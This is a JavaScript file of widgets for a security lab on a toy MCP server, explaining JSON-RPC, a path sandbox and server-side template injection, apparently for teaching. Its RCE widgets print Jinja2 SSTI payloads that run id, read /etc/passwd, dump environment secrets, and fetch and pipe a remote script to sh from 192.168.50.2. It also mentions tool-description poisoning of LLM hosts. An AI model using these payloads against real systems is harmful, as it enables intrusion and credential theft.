/* ============================================================
 * Lab 09 — viz.js (microMCP walkthrough)
 *
 * Widgets:
 *   1. #viz-try-it — interactive JSON-RPC stepper showing the
 *                    initialize → tools/list → tools/call round trips
 *   2. inline glossary (data-gloss="..." spans)
 * ============================================================ */

(function () {
  'use strict';

  // ============================================================
  // Widget 1 · JSON-RPC trace stepper
  // ============================================================
  (function initTryIt() {
    const root = document.getElementById('viz-try-it');
    if (!root) return;

    const stepBtn   = document.getElementById('mcp-step');
    const runBtn    = document.getElementById('mcp-run');
    const resetBtn  = document.getElementById('mcp-reset');
    const progEl    = document.getElementById('mcp-progress');
    const wireEl    = document.getElementById('mcp-wire');
    const explainEl = document.getElementById('mcp-explain');

    // Three round trips that exercise the entire protocol.
    const TRACE = [
      {
        out: {
          jsonrpc: '2.0', id: 1, method: 'initialize',
          params: { protocolVersion: '0.1', capabilities: { tools: {} } },
        },
        in: {
          jsonrpc: '2.0', id: 1,
          result: {
            protocolVersion: '0.1',
            capabilities: { tools: {} },
            serverInfo: { name: 'micromcp', version: '0.1.0' },
          },
        },
        title: 'Round trip 1 · initialize',
        body:
          '<p>The host introduces itself, announces the protocol version, and ' +
          'tells the server which capabilities it wants. The server replies ' +
          'with its own name, version, and capabilities. Both sides now know ' +
          'who they are talking to.</p>' +
          '<p>Notice the request/response correlation by <code>id</code> — ' +
          'JSON-RPC 2.0 lets multiple in-flight requests share a transport.</p>',
      },
      {
        out: {
          jsonrpc: '2.0', id: 2, method: 'tools/list', params: {},
        },
        in: {
          jsonrpc: '2.0', id: 2,
          result: {
            tools: [
              { name: 'get_greeting', description: 'Return a friendly greeting. Useful for testing the connection.' },
              { name: 'read_file',    description: 'Read a UTF-8 text file from the micromcp knowledge base.' },
            ],
          },
        },
        title: 'Round trip 2 · tools/list',
        body:
          '<p>The host asks the server "what tools have you got?" The server ' +
          'replies with the entire catalog — names, descriptions, and (omitted ' +
          'here for brevity) JSON-Schema for each tool\'s inputs.</p>' +
          '<p><strong>The host injects every description into the LLM\'s system prompt.</strong> ' +
          'The user typically sees only the names. This asymmetry is the attack ' +
          'surface for Lab 10 §2 (description poisoning).</p>',
      },
      {
        out: {
          jsonrpc: '2.0', id: 3, method: 'tools/call',
          params: { name: 'read_file', arguments: { path: 'password_policy.md' } },
        },
        in: {
          jsonrpc: '2.0', id: 3,
          result: {
            content: [
              { type: 'text', text:
                '# Password Reset Policy\n\nVisit https://password.megacorpone.local …' },
            ],
          },
        },
        title: 'Round trip 3 · tools/call',
        body:
          '<p>The LLM picked <code>read_file</code> from the catalog and proposed ' +
          'an argument. The host (after any user confirmation) sent the call. The ' +
          'server ran the tool function and returned an MCP content block.</p>' +
          '<p>That content block lands back in the LLM\'s context as if it were ' +
          'a user message — exactly the trust-boundary problem Lab 07 named. ' +
          'Lab 10 §6 chains tools so a stored ticket re-enters render_report ' +
          'as a Jinja2 template — and runs as code.</p>',
      },
    ];

    let step = 0;

    function escapeHTML(s) {
      return s.replace(/[&<>]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' }[c]));
    }
    function fmt(obj) { return escapeHTML(JSON.stringify(obj, null, 2)); }

    function render() {
      progEl.textContent = step + ' / ' + TRACE.length + ' round trips';
      stepBtn.disabled = step >= TRACE.length;
      runBtn.disabled  = step >= TRACE.length;

      if (step === 0) {
        wireEl.innerHTML = '<span class="mcp-wire-empty">Press ▶ Step to send the first request.</span>';
        explainEl.innerHTML =
          '<h4>The protocol on one screen</h4>' +
          '<p>Three round trips cover the entire MCP-tools surface. Step through ' +
          'and you have seen every method this server implements.</p>';
        return;
      }

      // Render every trace step up to `step`.
      wireEl.innerHTML = '';
      for (let i = 0; i < step; i++) {
        const t = TRACE[i];
        const o = document.createElement('span');
        o.className = 'mcp-line mcp-line-out';
        o.innerHTML = '<span class="mcp-tag">host → server</span>\n' + fmt(t.out);
        wireEl.appendChild(o);
        const r = document.createElement('span');
        r.className = 'mcp-line mcp-line-in';
        r.innerHTML = '<span class="mcp-tag">host ← server</span>\n' + fmt(t.in);
        wireEl.appendChild(r);
      }
      wireEl.scrollTop = wireEl.scrollHeight;

      const cur = TRACE[step - 1];
      explainEl.innerHTML = '<h4>' + cur.title + '</h4>' + cur.body;
    }

    function next() { if (step < TRACE.length) { step += 1; render(); } }
    function runToEnd() {
      const tick = () => { if (step < TRACE.length) { step += 1; render(); setTimeout(tick, 600); } };
      tick();
    }

    stepBtn.addEventListener('click', next);
    runBtn.addEventListener('click', runToEnd);
    resetBtn.addEventListener('click', () => { step = 0; render(); });

    render();
  })();

  // ============================================================
  // Widget 2 · read_file sandbox · resolve-then-prefix tracer
  //   Mirrors micromcp.py read_file():
  //     p = (DATA / path).resolve()
  //     if not str(p).startswith(str(DATA.resolve())): refuse
  // ============================================================
  (function initSandbox() {
    const root = document.getElementById('viz-sandbox');
    if (!root) return;

    const DATA = '/home/you/lab06/microdata';
    // The three files that actually live in microdata/ (for the exists check).
    const FILES = new Set([
      DATA + '/hello.md',
      DATA + '/password_policy.md',
      DATA + '/network_help.md',
    ]);

    const input   = document.getElementById('sbx-input');
    const dataEl  = document.getElementById('sbx-data');
    const rawEl   = document.getElementById('sbx-raw');
    const resEl   = document.getElementById('sbx-resolved');
    const checkEl = document.getElementById('sbx-check');
    const verdict = document.getElementById('sbx-verdict');

    const esc = (s) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');

    // pathlib semantics: (DATA / path) — an absolute RHS discards the left.
    function rawJoin(path) {
      return path.startsWith('/') ? path : DATA + '/' + path;
    }

    // .resolve() — collapse '' / '.' / '..' segments into a canonical absolute path.
    function resolve(joined) {
      const stack = [];
      for (const seg of joined.split('/')) {
        if (seg === '' || seg === '.') continue;
        if (seg === '..') { stack.pop(); continue; }
        stack.push(seg);
      }
      return '/' + stack.join('/');
    }

    function render() {
      const path = input.value;
      const joined = rawJoin(path);
      const resolved = resolve(joined);
      // Exact string-prefix test, as the server does it.
      const inside = resolved === DATA || resolved.startsWith(DATA + '/');

      dataEl.textContent = DATA;

      // Step 1 — raw join, ".." kept literal and highlighted.
      rawEl.innerHTML = esc(joined).replace(/(\.\.)/g, '<span class="sbx-dots">$1</span>');

      // Step 2 — resolved path; green-highlight the DATA prefix when it matches.
      if (inside) {
        const tail = resolved.slice(DATA.length);
        resEl.innerHTML = '<span class="sbx-in">' + esc(DATA) + '</span>' + esc(tail);
      } else {
        resEl.innerHTML = '<span class="sbx-out">' + esc(resolved) + '</span>';
      }

      // Step 3 — the boolean.
      checkEl.innerHTML =
        '<span class="' + (inside ? 'sbx-in' : 'sbx-out') + '">' +
        esc('"' + resolved + '".startswith("' + DATA + '")') +
        '</span> → <strong>' + (inside ? 'True' : 'False') + '</strong>';

      // Verdict.
      root.classList.remove('sbx-ok', 'sbx-warn', 'sbx-bad');
      if (!inside) {
        root.classList.add('sbx-bad');
        verdict.innerHTML = '<span class="sbx-tag">refused</span> <code>error: path escapes the sandbox</code>';
      } else if (FILES.has(resolved)) {
        root.classList.add('sbx-ok');
        verdict.innerHTML = '<span class="sbx-tag">allowed</span> inside the sandbox and the file exists — its contents are returned.';
      } else {
        root.classList.add('sbx-warn');
        verdict.innerHTML = '<span class="sbx-tag">allowed</span> <code>error: not found: ' + esc(path) + '</code> — the sandbox passed; there is just no such file in <code>microdata/</code>.';
      }
    }

    input.addEventListener('input', render);
    root.querySelectorAll('.sbx-presets button').forEach((b) => {
      b.addEventListener('click', () => { input.value = b.dataset.path; render(); });
    });

    render();
  })();

  // ============================================================
  // Widget 3 · the stdio main() loop · feed it a line, watch the branch
  //   Mirrors micromcp.py main(): strip → json.loads → METHODS.get →
  //   handler(params) → reply, with the four early-exit branches.
  // ============================================================
  (function initLoop() {
    const root = document.getElementById('viz-loop');
    if (!root) return;

    const stdinEl  = document.getElementById('lp-stdin');
    const stdoutEl = document.getElementById('lp-stdout');
    const steps    = {};
    root.querySelectorAll('.lp-step').forEach((el) => { steps[el.dataset.step] = el; });
    const ORDER = ['recv', 'strip', 'parse', 'extract', 'lookup', 'dispatch'];

    const DATA = '/home/you/lab06/microdata';
    const HELLO =
      '# Hello from microMCP\n\nIf you can read this file through the read_file tool, the server is working.';
    const FILES = { [DATA + '/hello.md']: HELLO };
    const METHODS = ['initialize', 'tools/list', 'tools/call'];

    // --- the same resolve-then-prefix guard the sandbox widget models ---
    function resolve(joined) {
      const stack = [];
      for (const seg of joined.split('/')) {
        if (seg === '' || seg === '.') continue;
        if (seg === '..') { stack.pop(); continue; }
        stack.push(seg);
      }
      return '/' + stack.join('/');
    }
    function readFile(path) {
      const p = resolve(path.startsWith('/') ? path : DATA + '/' + path);
      if (!(p === DATA || p.startsWith(DATA + '/'))) return 'error: path escapes the sandbox';
      if (!(p in FILES)) return 'error: not found: ' + path;
      return FILES[p];
    }
    // --- dispatch a known method to a result object (handlers in micromcp.py) ---
    function dispatch(method, params) {
      if (method === 'initialize') {
        return { protocolVersion: '0.1', capabilities: { tools: {} },
                 serverInfo: { name: 'micromcp', version: '0.1.0' } };
      }
      if (method === 'tools/list') {
        return { tools: [{ name: 'get_greeting' }, { name: 'read_file' }] };
      }
      // tools/call
      const name = params.name || '';
      const args = params.arguments || {};
      if (name === 'get_greeting') {
        return { content: [{ type: 'text', text: 'Hello, ' + (args.name || 'world') + '! This greeting came from micromcp.' }] };
      }
      if (name === 'read_file') {
        return { content: [{ type: 'text', text: readFile(args.path != null ? String(args.path) : '') }] };
      }
      return { isError: true, content: [{ type: 'text', text: 'unknown tool: ' + name }] };
    }

    // shorten a multi-line / long stdout payload so it stays one readable line
    function compact(obj) {
      let s = JSON.stringify(obj);
      s = s.replace(/\\n/g, '⏎');
      return s.length > 160 ? s.slice(0, 157) + '…' : s;
    }

    function trace(rawLine) {
      const st = { recv: 'dim', strip: 'dim', parse: 'dim', extract: 'dim', lookup: 'dim', dispatch: 'dim' };
      const note = {};
      st.recv = 'pass';
      note.recv = 'received one line from stdin';

      const stripped = rawLine.trim();
      if (stripped === '') {
        st.strip = 'exit-skip';
        note.strip = 'empty after strip → continue (no reply written)';
        return { st, note, stdout: '(nothing — the loop moves to the next line)' };
      }
      st.strip = 'pass';
      note.strip = 'non-empty, keep going';

      let req;
      try { req = JSON.parse(stripped); }
      catch (e) {
        st.parse = 'exit-error';
        note.parse = 'json.loads raised JSONDecodeError → reply with code -32700';
        return { st, note, stdout: compact({ jsonrpc: '2.0', id: null, error: { code: -32700, message: 'parse error' } }) };
      }
      st.parse = 'pass';
      note.parse = 'parsed into a request object';

      const rid = (req && 'id' in req) ? req.id : null;
      const method = (req && req.method) || '';
      st.extract = 'pass';
      note.extract = 'method = "' + method + '",  id = ' + JSON.stringify(rid);

      if (!METHODS.includes(method)) {
        st.lookup = 'exit-error';
        note.lookup = 'METHODS.get("' + method + '") → None → reply with code -32601';
        return { st, note, stdout: compact({ jsonrpc: '2.0', id: rid, error: { code: -32601, message: 'unknown method: ' + method } }) };
      }
      st.lookup = 'pass';
      note.lookup = 'handler = handle_' + method.replace('/', '_') + '()';

      const result = dispatch(method, (req && req.params) || {});
      st.dispatch = 'pass';
      note.dispatch = 'handler ran, result written to stdout';
      return { st, note, stdout: compact({ jsonrpc: '2.0', id: rid, result }) };
    }

    function show(rawLine, btn) {
      stdinEl.textContent = rawLine === '' || rawLine.trim() === '' ? '␣ (blank line)' : rawLine;
      const { st, note, stdout } = trace(rawLine);
      ORDER.forEach((k) => {
        const el = steps[k];
        el.classList.remove('pass', 'exit-skip', 'exit-error', 'dim');
        el.classList.add(st[k]);
        el.querySelector('.lp-note').textContent = note[k] || (st[k] === 'dim' ? 'not reached' : '');
      });
      stdoutEl.textContent = stdout;
      root.querySelectorAll('.lp-presets .btn').forEach((b) => b.classList.toggle('is-active', b === btn));
    }

    const buttons = Array.from(root.querySelectorAll('.lp-presets .btn'));
    buttons.forEach((b) => b.addEventListener('click', () => show(b.dataset.line, b)));
    // open on the first (initialize) example
    show(buttons[0].dataset.line, buttons[0]);
  })();

  // ============================================================
  // Widget 3b · client ⇄ server round trip (§3)
  //   One REPL command, traced across the stdio pipe. The server model
  //   mirrors micromcp.py: get_greeting + read_file, same sandbox guard.
  // ============================================================
  (function initClientServer() {
    const root = document.getElementById('viz-client');
    if (!root) return;

    const DATA = '/home/you/lab06/microdata';
    const FILES = {
      'hello.md':
        '# Hello from microMCP\n\nIf you can read this file through the read_file\n' +
        'tool, the server is working.',
      'password_policy.md':
        '# Password Reset Policy\n\nVisit https://password.megacorpone.local\n' +
        'to reset your password.',
      'network_help.md':
        '# Wi-Fi Troubleshooting\n\nIf your Wi-Fi keeps dropping: forget the\n' +
        'network and rejoin.',
    };

    // --- server side: mirror micromcp.py exactly --------------------
    function resolve(path) {
      const joined = path.startsWith('/') ? path : DATA + '/' + path;
      const stack = [];
      for (const seg of joined.split('/')) {
        if (seg === '' || seg === '.') continue;
        if (seg === '..') { stack.pop(); continue; }
        stack.push(seg);
      }
      return '/' + stack.join('/');
    }
    function readFile(path) {
      const resolved = resolve(path);
      const inside = resolved === DATA || resolved.startsWith(DATA + '/');
      if (!inside) return 'error: path escapes the sandbox';
      const name = resolved.slice(DATA.length + 1);
      if (!(name in FILES)) return 'error: not found: ' + path;
      return FILES[name];
    }
    function dispatch(method, params) {
      if (method === 'initialize') {
        return { protocolVersion: '0.1', capabilities: { tools: {} },
                 serverInfo: { name: 'micromcp', version: '0.1.0' } };
      }
      if (method === 'tools/list') {
        return { tools: [
          { name: 'get_greeting', description: 'Return a friendly greeting. Useful for testing the connection.' },
          { name: 'read_file',    description: 'Read a UTF-8 text file from the micromcp knowledge base.' },
        ] };
      }
      // tools/call
      const name = params.name;
      const args = params.arguments || {};
      let text;
      if (name === 'get_greeting') {
        text = 'Hello, ' + (args.name || 'world') + '! This greeting came from micromcp.';
      } else if (name === 'read_file') {
        text = readFile(args.path != null ? String(args.path) : '');
      } else {
        return { isError: true, content: [{ type: 'text', text: 'unknown tool: ' + name }] };
      }
      return { content: [{ type: 'text', text: text }] };
    }

    // --- client side: parse a REPL line into method + params --------
    const KW = /(\w+)\s*=\s*('[^']*'|"[^"]*"|\S+)/g;
    function parseCommand(line) {
      const trimmed = line.trim();
      if (!trimmed) return { error: 'empty command' };
      const parts = trimmed.split(/\s+/);
      const cmd = parts[0];
      if (cmd === 'list') return { method: 'tools/list', params: {} };
      if (cmd !== 'call') return { error: 'unknown command: ' + cmd + ' (try list | call …)' };
      const name = parts[1];
      if (!name) return { error: 'usage: call NAME [key=value]…' };
      const rest = trimmed.slice(trimmed.indexOf(name) + name.length);
      const kwargs = {};
      let m;
      KW.lastIndex = 0;
      while ((m = KW.exec(rest)) !== null) kwargs[m[1]] = m[2].replace(/^['"]|['"]$/g, '');
      return { method: 'tools/call', params: { name: name, arguments: kwargs } };
    }

    // --- formatting helpers -----------------------------------------
    function esc(s) {
      return String(s).replace(/[&<>]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' }[c]));
    }
    const j = (o) => JSON.stringify(o);
    function truncTexts(obj) {
      // shorten long text bodies so the wire JSON stays one readable line
      const clone = JSON.parse(JSON.stringify(obj));
      const walk = (o) => {
        if (Array.isArray(o)) o.forEach(walk);
        else if (o && typeof o === 'object') {
          for (const k of Object.keys(o)) {
            if (k === 'text' && typeof o[k] === 'string') {
              o[k] = o[k].split('\n')[0] + (o[k].includes('\n') ? ' …' : '');
            } else walk(o[k]);
          }
        }
      };
      walk(clone);
      return clone;
    }

    // --- element handles --------------------------------------------
    const els = {};
    root.querySelectorAll('[data-cs]').forEach((el) => { els[el.dataset.cs] = el; });
    const ORDER = ['parse', 'build', 'send', 'dispatch', 'result', 'recv', 'unwrap', 'print'];
    const codeOf = (key) => els[key].querySelector('.cs-code') || els[key].querySelector('.cs-wire-json');

    const input  = document.getElementById('cs-input');
    const runBtn = document.getElementById('cs-run');
    const stepBtn = document.getElementById('cs-step');
    const resetBtn = document.getElementById('cs-reset');

    let rid = 0;          // request id counter, like itertools.count(1)
    let steps = [];       // built per Run
    let cursor = 0;       // how many steps revealed
    let playTimer = null;

    function clearStage() {
      if (playTimer) { clearTimeout(playTimer); playTimer = null; }
      ORDER.forEach((k) => {
        els[k].classList.remove('is-active', 'is-done', 'is-flowing');
        const c = codeOf(k);
        if (c) c.innerHTML = '';
      });
      root.classList.remove('cs-bad', 'cs-ok');
      steps = [];
      cursor = 0;
    }

    // Build the step list for the current command.
    function plan() {
      clearStage();
      const parsed = parseCommand(input.value);
      if (parsed.error) {
        els.parse.classList.add('is-active');
        codeOf('parse').innerHTML = '<span class="cs-err">' + esc(parsed.error) + '</span>';
        return false;
      }
      rid += 1;
      const req = { jsonrpc: '2.0', id: rid, method: parsed.method, params: parsed.params };
      const result = dispatch(parsed.method, parsed.params);
      const resp = { jsonrpc: '2.0', id: rid, result: result };

      // What the client prints (mirrors tools_list / tools_call return paths).
      let printed, blocked = false;
      if (parsed.method === 'tools/list') {
        printed = result.tools.map(t => '  ' + t.name.padEnd(14) + t.description).join('\n');
      } else {
        printed = result.content[0].text;
        blocked = /^error: path escapes the sandbox/.test(printed);
      }

      const p = parsed.params;
      const parseDesc = parsed.method === 'tools/list'
        ? 'cmd "list" → method=<b>tools/list</b>'
        : 'method=<b>tools/call</b>  name=' + esc(p.name) +
          '  arguments=' + esc(j(p.arguments));

      steps = [
        ['parse',    parseDesc],
        ['build',    'req = ' + esc(j(req))],
        ['send',     esc(j(req)) + '\\n'],
        ['dispatch', parsed.method === 'tools/list'
                       ? 'METHODS["tools/list"]()'
                       : 'METHODS["tools/call"](params) → ' +
                         esc(p.name) + '(' + esc(j(p.arguments).slice(1, -1)) + ')'],
        ['result',   esc(j(truncTexts(result)))],
        ['recv',     esc(j(truncTexts(resp))) + '\\n'],
        ['unwrap',   parsed.method === 'tools/list'
                       ? 'tools = resp["result"]["tools"]'
                       : 'text = resp["result"]["content"][0]["text"]'],
        ['print',    '<pre class="cs-printed">' + esc(printed) + '</pre>'],
      ];
      if (blocked) root.classList.add('cs-bad');
      else root.classList.add('cs-ok');
      return true;
    }

    function reveal(i) {
      const [key, html] = steps[i];
      const el = els[key];
      const c = codeOf(key);
      if (c) c.innerHTML = html;
      el.classList.add('is-active');
      if (key === 'send' || key === 'recv') el.classList.add('is-flowing');
      // de-emphasise the previously active step
      if (i > 0) {
        const prev = els[steps[i - 1][0]];
        prev.classList.remove('is-active', 'is-flowing');
        prev.classList.add('is-done');
      }
    }

    function step() {
      if (!steps.length) { if (!plan()) return; }
      if (cursor >= steps.length) return;
      reveal(cursor);
      cursor += 1;
      // mark the final step done when we reach the end
      if (cursor === steps.length) {
        els[steps[cursor - 1][0]].classList.add('is-done');
      }
    }

    function run() {
      if (!plan()) return;
      const tick = () => {
        if (cursor >= steps.length) {
          els[steps[steps.length - 1][0]].classList.add('is-done');
          playTimer = null;
          return;
        }
        reveal(cursor);
        cursor += 1;
        playTimer = setTimeout(tick, 720);
      };
      tick();
    }

    runBtn.addEventListener('click', run);
    stepBtn.addEventListener('click', step);
    resetBtn.addEventListener('click', clearStage);
    input.addEventListener('keydown', (e) => { if (e.key === 'Enter') run(); });
    root.querySelectorAll('.cs-preset').forEach((b) => {
      b.addEventListener('click', () => { input.value = b.dataset.cmd; run(); });
    });

    clearStage();
  })();

  // ============================================================
  // Widget 3b2 · the double render (§4.3) — render #1 vs render #2
  // ============================================================
  (function initDoubleRender() {
    const root = document.getElementById('viz-double-render');
    if (!root) return;

    const RULE = '======================';
    const esc = (s) => s.replace(/[&<>]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' }[c]));

    const VARIANTS = {
      benign: {
        data: 'Closed 3 tickets this sprint. All systems nominal.',
        r2: 'Closed 3 tickets this sprint. All systems nominal.',
        verdict: 'safe', vlabel: 'no-op · safe',
        r1hint: 'The ticket text is now sitting in the report as ordinary characters.',
        r2hint: 'No {{ }} anywhere in the text, so render #2 has nothing to evaluate — the output is identical to render #1.',
      },
      malicious: {
        data: "{{ lipsum.__globals__['os'].popen('id').read() }}",
        r2: 'uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)',
        verdict: 'rce', vlabel: 'evaluated · RCE',
        r1hint: 'The payload was copied in LITERALLY — the {{ }} is still just text here, nothing has run yet.',
        r2hint: "render #2 parses that {{ }} as a template and evaluates it, so the slot is replaced by the command's OUTPUT. The id command ran on the server.",
      },
    };

    // The report template render_report builds, with the data slot substituted.
    const doc = (slotHTML) =>
      'Sprint Report — MegaCorpAI\n' + RULE + '\n' + slotHTML + '\n\n' + RULE + '\nEnd of Report';

    const dataEl = document.getElementById('dr-data');
    const r1El = document.getElementById('dr-r1');
    const r2El = document.getElementById('dr-r2');
    const r1hintEl = document.getElementById('dr-r1-hint');
    const r2hintEl = document.getElementById('dr-r2-hint');
    const verdictEl = document.getElementById('dr-verdict');
    const btns = root.querySelectorAll('.dr-variant');

    let variant = 'benign';

    function render() {
      const v = VARIANTS[variant];
      const attacker = (t) => '<span class="dr-attacker">' + esc(t) + '</span>';

      // ① the raw ticket data
      dataEl.innerHTML = attacker(v.data);

      // ② after render #1 — slot filled with the data, verbatim
      r1El.innerHTML = doc(attacker(v.data));
      r1hintEl.textContent = v.r1hint;

      // ③ after render #2 — slot is the re-parsed result
      const cls = v.verdict === 'rce' ? 'dr-evald' : 'dr-inert';
      r2El.innerHTML = doc('<span class="' + cls + '">' + esc(v.r2) + '</span>');
      r2hintEl.textContent = v.r2hint;
      verdictEl.textContent = v.vlabel;
      verdictEl.className = 'dr-verdict dr-' + v.verdict;

      btns.forEach((b) => b.classList.toggle('is-active', b.dataset.variant === variant));
    }

    btns.forEach((b) => b.addEventListener('click', () => { variant = b.dataset.variant; render(); }));
    render();
  })();

  // ============================================================
  // Widget 3c · what is RCE? (§4.3) — payload climbs to a shell
  // ============================================================
  (function initRCE() {
    const root = document.getElementById('viz-rce');
    if (!root) return;

    const GOALS = {
      whoami: {
        payload: "{{ lipsum.__globals__['os'].popen('id').read() }}",
        cmd: 'id',
        out: 'uid=1000(appuser) gid=1000(appuser) groups=1000(appuser)',
        impact: "Confirms code runs as the server's user — the foothold every later step builds on.",
      },
      readfile: {
        payload: "{{ lipsum.__globals__['os'].popen('cat /etc/passwd').read() }}",
        cmd: 'cat /etc/passwd',
        out: 'root:x:0:0:root:/root:/bin/bash\nappuser:x:1000:1000::/home/appuser:/bin/sh',
        impact: 'The §4.1 sandbox limited reads to one folder. RCE ignores it — popen reads any file the OS user can.',
      },
      secrets: {
        payload: "{{ lipsum.__globals__['os'].popen('env').read() }}",
        cmd: 'env',
        out: 'DB_PASSWORD=Pr0d_DB_S3cret!2025\nAWS_SECRET_ACCESS_KEY=wJalrXUtn/K7MDENG/…',
        impact: 'Environment variables hold API keys and DB passwords. One command exfiltrates the lot.',
      },
      shell: {
        payload: "{{ lipsum.__globals__['os'].popen('curl http://192.168.50.2/x.sh | sh').read() }}",
        cmd: 'curl http://192.168.50.2/x.sh | sh',
        out: '(the attacker now has an interactive shell on the server — full control)',
        impact: 'The endgame: a reverse shell turns one report field into a remote terminal on the box.',
      },
    };

    const ORDER = ['store', 'a1', 'join', 'a2', 'render', 'a3', 'os', 'a4', 'shell'];
    const nodes = {};
    root.querySelectorAll('[data-rce]').forEach((el) => { nodes[el.dataset.rce] = el; });

    const payloadEl = document.getElementById('rce-payload');
    const cmdEl = document.getElementById('rce-cmd');
    const outEl = document.getElementById('rce-out');
    const impactEl = document.getElementById('rce-impact');
    const goalBtns = root.querySelectorAll('.rce-goal');
    const runBtn = document.getElementById('rce-run');
    const stepBtn = document.getElementById('rce-step');
    const resetBtn = document.getElementById('rce-reset');

    let goal = 'whoami';
    let cursor = 0;
    let timer = null;

    function setGoal(key) {
      goal = key;
      goalBtns.forEach((b) => b.classList.toggle('is-active', b.dataset.goal === key));
      const g = GOALS[key];
      payloadEl.textContent = g.payload;
      cmdEl.textContent = g.cmd;
      outEl.textContent = '';        // revealed only when the flow reaches the shell
      impactEl.textContent = '';
    }

    function clearFlow() {
      if (timer) { clearTimeout(timer); timer = null; }
      ORDER.forEach((k) => nodes[k].classList.remove('is-active', 'is-done'));
      cursor = 0;
      outEl.textContent = '';
      impactEl.textContent = '';
    }

    function reveal(i) {
      const key = ORDER[i];
      if (i > 0) nodes[ORDER[i - 1]].classList.remove('is-active');
      if (i > 0) nodes[ORDER[i - 1]].classList.add('is-done');
      nodes[key].classList.add('is-active');
      if (key === 'shell') {
        const g = GOALS[goal];
        outEl.textContent = g.out;
        impactEl.textContent = g.impact;
      }
    }

    function step() {
      if (cursor >= ORDER.length) return;
      reveal(cursor);
      cursor += 1;
      if (cursor === ORDER.length) nodes[ORDER[cursor - 1]].classList.add('is-done');
    }

    function run() {
      clearFlow();
      const tick = () => {
        if (cursor >= ORDER.length) {
          nodes[ORDER[ORDER.length - 1]].classList.add('is-done');
          timer = null;
          return;
        }
        reveal(cursor);
        cursor += 1;
        timer = setTimeout(tick, 560);
      };
      tick();
    }

    goalBtns.forEach((b) => b.addEventListener('click', () => { setGoal(b.dataset.goal); run(); }));
    runBtn.addEventListener('click', run);
    stepBtn.addEventListener('click', step);
    resetBtn.addEventListener('click', clearFlow);

    setGoal('whoami');
    clearFlow();
  })();

  // ============================================================
  // Widget 4 · inline glossary (compact version of the lab-07 pattern)
  // ============================================================
  (function initGlossary() {
    const GLOSSARY = {
      'mcp': {
        title: 'MCP · Model Context Protocol',
        body:
          '<p>An open protocol Anthropic published in November 2024 to give LLMs a ' +
          'uniform way to call external tools, read external data, and render ' +
          'external UI. JSON-RPC 2.0 over a transport (stdio or HTTP). Three role ' +
          'types: <strong>host</strong> (the IDE / chat / agent), <strong>server</strong> ' +
          '(the tool process), <strong>LLM</strong> (inside the host).</p>' +
          '<p>Within a year every major AI host added MCP support: Claude Desktop, ' +
          'OpenAI Apps, Continue, Cursor, LMStudio, Sourcegraph Cody. That broad ' +
          'adoption is also why MCP-server attacks matter — one compromised server ' +
          'reaches every host that connects to it.</p>',
      },
      'jsonrpc': {
        title: 'JSON-RPC 2.0',
        body:
          '<p>A tiny, transport-agnostic convention for "call a procedure on the ' +
          'other side and get a result back," where every message is a small JSON ' +
          'object. A request names a <strong>method</strong> (e.g. "tools/list"), ' +
          'carries a <strong>params</strong> object, and includes an <strong>id</strong>; ' +
          'the reply echoes that id with either a <strong>result</strong> or an ' +
          '<strong>error</strong>.</p>' +
          '<p>It is only the message shape — it says nothing about how the bytes move, ' +
          'so it rides on top of some transport (stdio between local processes, or ' +
          'HTTP for remote). MCP uses it as the envelope for every host-to-server ' +
          'exchange: list the tools, call a tool, read a resource.</p>',
      },
      'stdio': {
        title: 'stdio · standard input / output',
        body:
          '<p>Every process starts life with three text streams: <strong>stdin</strong> ' +
          '(bytes coming in), <strong>stdout</strong> (bytes going out), and ' +
          '<strong>stderr</strong> (a separate channel just for errors). When you run a ' +
          'program in a terminal, stdin is your keyboard and stdout is the screen.</p>' +
          '<p>Here there is no terminal. The host launches the server as a child process ' +
          'and wires those streams into a pipe: the host writes a JSON-RPC request to the ' +
          'server’s stdin, the server writes its reply to stdout, and the host reads ' +
          'it back. That pipe is the entire “transport” — no network involved.</p>' +
          '<svg viewBox="0 0 300 92" style="width:100%;max-width:330px;margin-top:8px;font-family:var(--sans),sans-serif;font-size:9px;" role="img" aria-label="The host launches micromcp as a child process and exchanges JSON over the child’s stdin and stdout.">' +
          '<defs>' +
          '<marker id="g-stdin-arr" markerWidth="7" markerHeight="7" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 z" fill="#b14a2e"/></marker>' +
          '<marker id="g-stdout-arr" markerWidth="7" markerHeight="7" refX="6" refY="3" orient="auto"><path d="M0,0 L6,3 L0,6 z" fill="#3f8c63"/></marker>' +
          '</defs>' +
          '<rect x="6" y="26" width="78" height="40" rx="5" fill="#f0eee5" stroke="#8a857d"/>' +
          '<text x="45" y="50" text-anchor="middle" font-size="11">host</text>' +
          '<rect x="216" y="26" width="78" height="40" rx="5" fill="#f0eee5" stroke="#8a857d"/>' +
          '<text x="255" y="46" text-anchor="middle" font-size="11">micromcp</text>' +
          '<text x="255" y="58" text-anchor="middle" font-size="7.5" fill="#8a857d">child process</text>' +
          '<line x1="86" y1="38" x2="212" y2="38" stroke="#b14a2e" stroke-width="1.5" marker-end="url(#g-stdin-arr)"/>' +
          '<text x="149" y="33" text-anchor="middle" fill="#b14a2e">stdin · request</text>' +
          '<line x1="212" y1="56" x2="86" y2="56" stroke="#3f8c63" stroke-width="1.5" marker-end="url(#g-stdout-arr)"/>' +
          '<text x="149" y="68" text-anchor="middle" fill="#3f8c63">stdout · reply</text>' +
          '</svg>',
      },
      'ssti': {
        title: 'SSTI · Server-Side Template Injection',
        body:
          '<p>A template engine (here Jinja2) builds a string by filling placeholders ' +
          'in a <em>template</em> with <em>values</em>: the template is trusted code you ' +
          'wrote, the values are data. <strong>SSTI is when attacker-controlled text ends ' +
          'up as part of the template itself instead of a value</strong> — so the engine ' +
          'evaluates the attacker’s <code>{{ ... }}</code> as template syntax.</p>' +
          '<p>Because those expressions run real Python, SSTI typically escalates to remote ' +
          'code execution (e.g. reaching <code>os.popen</code>). It is the template-engine ' +
          'cousin of SQL injection: the root cause is always data that gets promoted into ' +
          'code.</p>',
      },
      'rce': {
        title: 'RCE · Remote Code Execution',
        body:
          '<p>The most severe class of vulnerability: an attacker, over the network, makes a ' +
          'server run commands <strong>of their choosing</strong> — with the server’s own ' +
          'privileges. Reading files, dumping secrets, installing a backdoor, pivoting to other ' +
          'machines all follow from it.</p>' +
          '<p>RCE is usually the <em>end</em> of a chain, not the start: an injection flaw ' +
